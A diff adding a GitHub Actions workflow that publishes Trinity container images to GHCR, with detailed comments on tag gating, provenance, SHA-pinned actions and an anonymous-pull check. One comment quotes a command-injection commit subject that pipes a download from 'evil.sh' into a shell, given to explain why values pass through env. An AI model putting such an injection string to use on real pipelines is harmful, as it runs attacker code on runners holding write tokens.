@@ -1,0 +1,269 @@
+name: Publish container images
+
+# Publishes the five Trinity-built images to GHCR on every release tag, so a
+# hosted install pulls instead of building (#2280). Without this, a fresh VM
+# spends 5-10 minutes compiling the agent base image on first boot, which
+# fails the one-click bar for every marketplace channel (#2281, #2282).
+#
+# The checkout deliberately does NOT init submodules: `src/backend/enterprise`
+# is private, and these images are PUBLIC. A plain checkout leaves that path
+# empty, so the published backend is OSS-only by construction rather than by
+# a .dockerignore rule someone can edit (build-without-submodule.yml already
+# proves the OSS tree builds standalone).
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+    inputs:
+      ref:
+        description: 'Tag or SHA to build (defaults to the triggering ref)'
+        required: false
+        type: string
+
+permissions:
+  contents: read
+  packages: write
+
+concurrency:
+  group: publish-images-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  publish:
+    name: ${{ matrix.image }}
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          # `build_args` is per image, NOT a shared block. Only the backend
+          # declares the six provenance ARGs (docker/backend/Dockerfile:37-42)
+          # → ENV → `GET /api/version`; the scheduler and mcp-server Dockerfiles
+          # declare none at all, and passing an undeclared --build-arg makes
+          # BuildKit warn on every build, which trains everyone to ignore the
+          # warnings that matter.
+          - image: trinity-backend
+            context: .
+            dockerfile: docker/backend/Dockerfile
+            build_args: provenance
+          - image: trinity-frontend
+            context: ./src/frontend
+            dockerfile: docker/frontend/Dockerfile.prod
+            # Deliberately none. Every VITE_* var is statically inlined into the
+            # world-readable bundle at build time, so a published image can only
+            # carry values that are correct for EVERY install. The two that are
+            # actually read (VITE_BUG_REPORTING_ENABLED, VITE_BUG_INTAKE_URL)
+            # already default to exactly that in the Dockerfile. VITE_API_URL is
+            # inert — api.js uses `baseURL: ''` and nginx proxies same-origin
+            # (#722 is an explicit warning against wiring it up), which is the
+            # only reason a prebuilt frontend can be published at all.
+            build_args: none
+          - image: trinity-scheduler
+            context: .
+            dockerfile: docker/scheduler/Dockerfile
+            build_args: none
+          - image: trinity-mcp-server
+            context: ./src/mcp-server
+            dockerfile: src/mcp-server/Dockerfile
+            build_args: none
+          - image: trinity-agent-base
+            context: ./docker/base-image
+            dockerfile: docker/base-image/Dockerfile
+            # Mirrors scripts/deploy/build-base-image.sh, which is the only
+            # other producer of this image: VERSION alone, stamped as the
+            # trinity.base-image-version label.
+            build_args: version
+    steps:
+      - uses: actions/checkout@v7
+        with:
+          ref: ${{ inputs.ref || github.ref }}
+          submodules: false
+
+      - name: Collect build provenance
+        id: prov
+        env:
+          RESOLVED_REF: ${{ inputs.ref || github.ref_name }}
+        run: |
+          # Mirrors the args docker-compose.prod.yml forwards, so a pulled
+          # image answers GET /api/version with real values instead of
+          # "unknown" (#926/#958).
+          # Every value is read from the CHECKED-OUT tree. `GITHUB_REF_NAME`
+          # and `github.sha` describe the ref the workflow was *dispatched
+          # from*, which is not the same thing whenever `inputs.ref` is used —
+          # a dispatch of `ref: v0.9.0` from `dev` builds the tag's tree and
+          # would otherwise stamp `GIT_BRANCH=dev` into `GET /api/version` and
+          # publish it tagged with dev's head sha. That is precisely the path
+          # meant for out-of-band smoke builds, i.e. the one where provenance
+          # being a lie is most likely to mislead.
+          {
+            echo "version=$(tr -d '[:space:]' < VERSION)"
+            echo "git_commit=$(git rev-parse HEAD)"
+            echo "short_sha=$(git rev-parse --short=7 HEAD)"
+            echo "git_commit_subject=$(git log -1 --pretty=%s | tr -d '\n\r')"
+            echo "git_commit_timestamp=$(git log -1 --pretty=%cI)"
+            echo "git_branch=${RESOLVED_REF}"
+            echo "build_date=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          } >> "$GITHUB_OUTPUT"
+
+      # Third-party actions are SHA-pinned, as everywhere else in this repo
+      # (tailscale, pypa, appleboy, google-github-actions). A mutable tag on
+      # an action that holds a registry-write token is a supply-chain hole.
+      - uses: docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e  # v4.3.0
+
+      - uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f  # v4.6.0
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Derive image tags
+        id: meta
+        uses: docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302  # v6.2.0
+        with:
+          images: ghcr.io/${{ github.repository_owner }}/${{ matrix.image }}
+          # `latest` only on a real release tag — a workflow_dispatch smoke
+          # build must never silently become what every hosted install pulls.
+          #
+          # BOTH `0.9.0` and `v0.9.0` are published for the same digest.
+          # `{{version}}` strips the leading `v`, so a release cut as git tag
+          # `v0.9.0` published ONLY `0.9.0` — while every doc, the compose
+          # header and start.sh's own pin warning told operators to set
+          # `TRINITY_IMAGE_TAG=v0.9.0`. That pull fails `manifest unknown`, and
+          # start.sh treats it as fatal with a message blaming the operator's
+          # spelling. Publishing the v-prefixed alias costs one tag ref and
+          # makes the release name and the image tag the same string, which is
+          # what anyone reading the releases page will type.
+          #
+          # `type=sha` is NOT used: it resolves from `github.sha`, which on a
+          # `workflow_dispatch` with `ref:` is the dispatching branch's head,
+          # not the tree that was checked out and built. The raw value below
+          # comes from the actual HEAD (see the provenance step).
+          #
+          # `flavor: latest=false` is load-bearing, not decoration. The action's
+          # default is `latest=auto`, which applies `latest` on ANY semver tag
+          # ref on its own — so gating the explicit `type=raw` line below would
+          # have been inert, and the comment above it would have described a
+          # rule the workflow did not enforce.
+          flavor: latest=false
+          #
+          # Every mutable/version tag is gated on `github.event_name == 'push'`,
+          # i.e. on a real `git push` of a `v*` tag. `github.ref` alone answers
+          # "is this a tag ref", not "is this a release" — a `workflow_dispatch`
+          # started from a tag (the natural way to smoke-test this workflow)
+          # carries `refs/tags/v0.9.0` too. Dispatching an OLD tag then rebuilds
+          # at a new digest (the agent base bakes `Claude Code (latest)`, so the
+          # content genuinely differs), republishes `0.9.0`/`v0.9.0`/`0.9` over
+          # an immutable version, and walks `latest` BACKWARDS — silently
+          # downgrading every unpinned hosted install on its next
+          # `start.sh --hosted`.
+          #
+          # A dispatch therefore publishes `sha-<short>` and nothing else, which
+          # is exactly what a smoke build needs. Re-cutting a release is done by
+          # re-pushing the git tag, which fires `push` and takes the full set.
+          tags: |
+            type=semver,pattern={{version}},enable=${{ github.event_name == 'push' }}
+            type=semver,pattern=v{{version}},enable=${{ github.event_name == 'push' }}
+            type=semver,pattern={{major}}.{{minor}},enable=${{ github.event_name == 'push' }}
+            type=raw,value=latest,enable=${{ github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v') }}
+            type=raw,value=sha-${{ steps.prov.outputs.short_sha }}
+
+      - name: Select build args for this image
+        id: args
+        # Every value arrives through `env:`, never through ${{ }} inside the
+        # shell body. The commit SUBJECT is chosen by whoever lands the commit,
+        # so interpolating it into a `run:` script is a command-injection sink —
+        # a subject of `x"; curl evil.sh | sh; #` would execute on a runner that
+        # holds a packages:write token.
+        env:
+          KIND: ${{ matrix.build_args }}
+          P_VERSION: ${{ steps.prov.outputs.version }}
+          P_GIT_COMMIT: ${{ steps.prov.outputs.git_commit }}
+          P_GIT_COMMIT_SUBJECT: ${{ steps.prov.outputs.git_commit_subject }}
+          P_GIT_COMMIT_TIMESTAMP: ${{ steps.prov.outputs.git_commit_timestamp }}
+          P_GIT_BRANCH: ${{ steps.prov.outputs.git_branch }}
+          P_BUILD_DATE: ${{ steps.prov.outputs.build_date }}
+        run: |
+          set -euo pipefail
+          {
+            echo 'build_args<<TRINITY_EOF'
+            case "$KIND" in
+              provenance)
+                echo "VERSION=${P_VERSION}"
+                echo "GIT_COMMIT=${P_GIT_COMMIT}"
+                echo "GIT_COMMIT_SUBJECT=${P_GIT_COMMIT_SUBJECT}"
+                echo "GIT_COMMIT_TIMESTAMP=${P_GIT_COMMIT_TIMESTAMP}"
+                echo "GIT_BRANCH=${P_GIT_BRANCH}"
+                echo "BUILD_DATE=${P_BUILD_DATE}"
+                ;;
+              version)
+                echo "VERSION=${P_VERSION}"
+                ;;
+              none)
+                ;;
+              *)
+                echo "Unknown build_args kind '${KIND}'" >&2
+                exit 1
+                ;;
+            esac
+            echo 'TRINITY_EOF'
+          } >> "$GITHUB_OUTPUT"
+
+      - name: Build and push
+        uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a  # v7.3.0
+        with:
+          context: ${{ matrix.context }}
+          file: ${{ matrix.dockerfile }}
+          push: true
+          # amd64 only for v1: DO Droplets and Vultr Cloud Compute both
+          # default to amd64, so every marketplace lane is covered. The agent
+          # base image is ~1.9 GB (Python + Node + Go + Claude Code) and
+          # cross-building it under QEMU is slow and flaky. arm64 is a
+          # follow-up, gated on Hetzner CAX / Umbrel actually needing it.
+          platforms: linux/amd64
+          tags: ${{ steps.meta.outputs.tags }}
+          labels: ${{ steps.meta.outputs.labels }}
+          cache-from: type=gha,scope=${{ matrix.image }}
+          cache-to: type=gha,scope=${{ matrix.image }},mode=max
+          build-args: ${{ steps.args.outputs.build_args }}
+
+      # A container package first created by GITHUB_TOKEN is not reliably
+      # public. If any of the five lands private, `docker pull` on a fresh VM
+      # fails with `denied` — and start.sh, which has no way to tell that apart
+      # from a network fault, reports it to an operator who can do nothing
+      # about it. So prove the operator's exact path here, where it is cheap:
+      # an ANONYMOUS manifest fetch, with a scratch DOCKER_CONFIG so the
+      # runner's own ghcr.io login cannot mask a private package.
+      #
+      # This runs after the push and fails the job on purpose. The image is
+      # already published at that point; a red step is the signal to flip
+      # package visibility to Public once, which is a first-publish-only chore.
+      - name: Verify anonymous pull
+        env:
+          IMAGE_OWNER: ${{ github.repository_owner }}
+          IMAGE_NAME: ${{ matrix.image }}
+          TAG: sha-${{ steps.prov.outputs.short_sha }}
+        run: |
+          set -uo pipefail
+          # Lowercased here because this owner is literally `Abilityai` and a
+          # GHCR repository name must be lowercase: docker rejects the mixed-case
+          # reference LOCALLY, before any network call ("repository name must be
+          # lowercase"), so the loop below would burn its five retries and fail
+          # on EVERY publish — reporting a perfectly public package as private
+          # and destroying the one signal this step exists to give. The push
+          # itself is unaffected: docker/metadata-action lowercases its `images:`
+          # input, and start.sh hardcodes `ghcr.io/abilityai/`. A hand-written
+          # reference has to do it itself.
+          IMAGE="ghcr.io/$(printf '%s/%s' "$IMAGE_OWNER" "$IMAGE_NAME" | tr '[:upper:]' '[:lower:]')"
+          cfg=$(mktemp -d)
+          # GHCR visibility/propagation is not instant on a first publish.
+          for attempt in 1 2 3 4 5; do
+            if DOCKER_CONFIG="$cfg" docker manifest inspect "${IMAGE}:${TAG}" >/dev/null 2>&1; then
+              echo "${IMAGE}:${TAG} is anonymously pullable."
+              exit 0
+            fi
+            echo "attempt ${attempt}: not yet anonymously pullable, retrying..."
+            sleep 15
+          done
+          echo "::error title=GHCR package is not public::${IMAGE} cannot be pulled anonymously. A hosted install (scripts/deploy/start.sh --hosted) will fail with 'denied' on a fresh VM. Fix: GitHub → Packages → ${{ matrix.image }} → Package settings → Change visibility → Public. This is normally needed only on the first publish of a package."
+          exit 1
